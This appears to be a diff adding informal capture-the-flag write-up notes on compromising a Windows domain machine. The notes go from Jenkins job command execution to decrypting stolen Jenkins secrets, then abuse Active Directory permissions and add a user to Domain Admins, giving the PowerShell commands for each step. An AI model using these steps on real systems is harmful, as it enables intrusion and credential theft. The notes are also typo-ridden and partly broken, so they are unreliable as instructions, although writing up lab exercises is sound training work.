@@ -1,0 +1,52 @@
+i found a port 8080 which ran ==jenkins==, so no sqli was needed and i registered an account.
+
+then we can do rce by creating a new item and choosing Freestyle project (as only this one was giving detailed output )
+
+then we build trigger * * * * *  for every ==minute==
+
+and build a ==windows batch file==
+
+and write code with ==cmd /c whoami==
+
+on github we found a repo for jennekins password decrypter
+
+`https://github.com/hoto/jenkins-credentials-decryptor`
+
+it required creds.xml,mster.key,hudson.util.secret,config.xml
+
+`so we found these items on C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets`
+
+to read it we did
+
+`certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.. h.b64 & more .\h.b64` same for both files
+
+and for config.xml which contains the hashed password it was on
+
+`C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin\config.xml`
+
+we ran the script and got password
+
+we logged in using winrm adn got user.txt
+
+we ran ==SharpHound== as it was AD machine as port 88 was internally open
+
+sharphound said ==FORCECHANGE PASSWORD== and we ran the command to change the password for smith and used winrm as smith
+
+then smith can log as maria if do ==GENERICWRITE== said by bloodhound
+
+we added a ==spn== on maria and read the desktop data from where we got winrm password
+
+```
+echo "copy C:\users\maria\Desktop\Engines.xls  \programdata\" > cmd.ps1
+echo "ls C:\users\maria\Desktop > \programdata\out" > cmd.ps1
+
+Set-DomainObject -Identity maria -SET @{scriptpath='C:\\ProgramData\\cmd.ps1'}
+```
+
+we added maria to ==domain admins== adn now after logging out and in we are admins
+
+```
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights Al
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
+```
